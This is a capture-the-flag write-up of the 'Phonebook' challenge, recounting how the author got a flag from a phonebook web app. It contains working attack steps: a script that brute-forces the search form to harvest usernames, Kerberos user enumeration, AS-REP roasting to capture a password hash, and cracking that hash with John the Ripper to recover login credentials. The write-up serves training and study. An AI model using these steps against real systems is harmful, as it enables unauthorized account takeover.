# Phonebook (4 pts)
Hi Expert,

the archaeologists are looking forward to get some phone numbers from the phone book running on http://78.128.246.142, don't make them wait too long.

Good Luck!

HINT1: It looks like that only logged users can see the phone numbers.

HINT2: Check also other services on given server 78.128.246.142.

HINT3: Impacket is not always the best friend, sometimes John suite works better, especially for non-windows platforms.

## Recon
### Nmap Scan
```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-18 12:21 CEST
Nmap scan report for 78.128.246.142
Host is up (0.028s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE      VERSION
80/tcp open  http         Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
88/tcp open  kerberos-sec MIT Kerberos (server time: 2021-10-18 10:22:20Z)
Service Info: Host: SUPERPHONEBOOK.TCC
```
We can see Apache running on port 80 and Kerberos running on port 88.


## Web Interface

![web](https://user-images.githubusercontent.com/20358070/140723145-28745a9b-83b8-4bd4-aed0-43e167b808a8.png)

We can see two parts.
1. Search - Allows to search the phonebook
2. Login - Allows you to login to (likely using kerberos?)

Trying the search functionality with query `a` results in

![query](https://user-images.githubusercontent.com/20358070/140723499-9e430b3e-d789-464f-8cb3-4e83f546c436.png)

so I just wrote a simple python script to bruteforce all two character combinations.

```py
import re
from itertools import permutations
from string import ascii_lowercase

import requests

names = list(set([''.join(pair) for pair in permutations(list(ascii_lowercase), 2)]))
names += [f"{letter}{letter}" for letter in ascii_lowercase]

url = "http://78.128.246.142/search"

for name in names:
    r = requests.post(url, data={"query": name})
    if "name:" in r.text:
        n = re.findall(r"name: (.+)<p>", r.text)
        m = re.findall(r"email: (.+)<p>", r.text)
        hp = re.findall(r"homepage: (.+)<p>", r.text)
        phone = re.findall(r"phone: (.+)<p>", r.text)
        print(n, m, hp, phone)
```
```
['Will Schroeder'] ['harmj0y@superphonebook.tcc'] ['https://www.harmj0y.net'] ['anonymous phone search disabled']
['Bill Bryant'] ['bill@superphonebook.tcc'] ['https://web.mit.edu/kerberos/www/dialogue.html'] ['anonymous phone search disabled']
['Aaron Spelling'] ['aaron@superphonebook.tcc'] ['http://enumerate.more'] ['anonymous phone search disabled']
['Bill Bryant', 'Will Schroeder'] ['bill@superphonebook.tcc', 'harmj0y@superphonebook.tcc'] ['https://web.mit.edu/kerberos/www/dialogue.html', 'https://www.harmj0y.net'] ['anonymous phone search disabled', 'anonymous phone search disabled']
['Aaron Spelling', 'Will Schroeder'] ['aaron@superphonebook.tcc', 'harmj0y@superphonebook.tcc'] ['http://enumerate.more', 'https://www.harmj0y.net'] ['anonymous phone search disabled', 'anonymous phone search disabled']
['Bill Bryant'] ['bill@superphonebook.tcc'] ['https://web.mit.edu/kerberos/www/dialogue.html'] ['anonymous phone search disabled']
['Theodore Ts&#39;o'] ['tytso@superphonebook.tcc'] [] ['anonymous phone search disabled']
```

I then created a wordlist with all of the usernames here, that is
```
harmj0y
bill
aaron
tytso
```

Now, we can use tools like `impacket` to query these usernames against kerberos and find out more. 

Impacket:
```
GetNPUsers.py -dc-ip 78.128.246.142 -no-pass -usersfile users.txt 'superphonebook.tcc'
```

Or, as I've used, `kerbrute`
```
kerbrute -dc-ip 78.128.246.142 -domain 'SUPERPHONEBOOK.tcc' -users users.txt -password doesnotmatter
[*] Valid user => tytso [NOT PREAUTH]
[*] No passwords were discovered :'(
```

Output of both tools should tell us that PREAUTH is disabled on user `tytso`, this make the account vulnerable to [AS-REP Roasting](https://akimbocore.com/article/asrep-roasting/).

Since we know tytso account is vulnerable, we can now request the AS-REP hash, which is essentialy encrypted session key with user's password. To do that, we can utilize another `impacket` tool, but since those tries have failed me, I decide to take another path and that was to capture the initial AS-REQ sequence in wireshark, save the capture to disk and process it with `tshark` and `krb2john`.

```
tshark -r capt2.pcap -T pdml > out.pdml
krb2john.py out.pdml  > tytsohash
```

This gave me this hash
```
$krb5asrep$18$SUPERPHONEBOOK.TCCtytso$2e307a6a5596b1492bee05b4d3191d645da738f5360edf9210d5cf48581dc2468ba5fb92e9a98e5a7da6d8d8b35a0d19e694b03f0003adc634bb6ec9b7b1886e1e2d5eb29590252dba02a4ad96236762cb5402b509c3ac74c6ff8a1523ba6f334c21254110bf7675fc2f9b63fb3f833eb8b0f7717640ab724187b01e0dba5959fdeaa50af9be25c54b203ff2f244f958d1a7a7db7055d96cad9aad96513cb64e1776961cd95c4b122ea3c5e6819c9ff9fc487fd161936b0cdf449d0c889762d102fbd63f6ea693e5d9fd2fde2559a668892219f86f11e6ab475290169a2f760e952afe2a32cbfce38f5b$7b34b6e4a4bb14a948980354
```
I spent about two days at the next step, because from CTF experience, if the challenge is crackable, the password is in rockyou (which obviously is not the case in real life so I understand the decision), however that was not the case here. Also since I prefer `hashcat` to crack password hashes, I spend a lot of time before realizing hashcat does not support this kind of hash (AS-REP Type 18).

After failing miserable with all kinds of wordlist, I decided to run iterative bruteforce in JtR, but instead on accident ran default wordlist (`john/run/password.lst`) and that cracked the password in about a second.

```
john --format=krb5asrep --min-length=4 tytsohash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Proceeding with single, rules:Single, lengths:1-125
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/home/josef/CTF/john/run/password.lst, lengths: 1-125
0g 0:00:00:04 22.88% 2/3 (ETA: 10:52:03) 0g/s 8430p/s 8430c/s 8430C/s active3..matthew7
garfunkel4       (?)     
1g 0:00:00:05 DONE 2/3 (2021-10-20 10:51) 0.1715g/s 8430p/s 8430c/s 8430C/s voyager4..slip4
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

So the correct credentials are `tytso:garfunkel4`, we can now use the login form in the web page, after logging in we can again use the search form to see the previously redacted fields, and as it turned out, Tytso's phone number contains a flag.

![flag](https://user-images.githubusercontent.com/20358070/140728345-2cdc9a6c-088d-401a-ab74-baec716ffe5b.png)
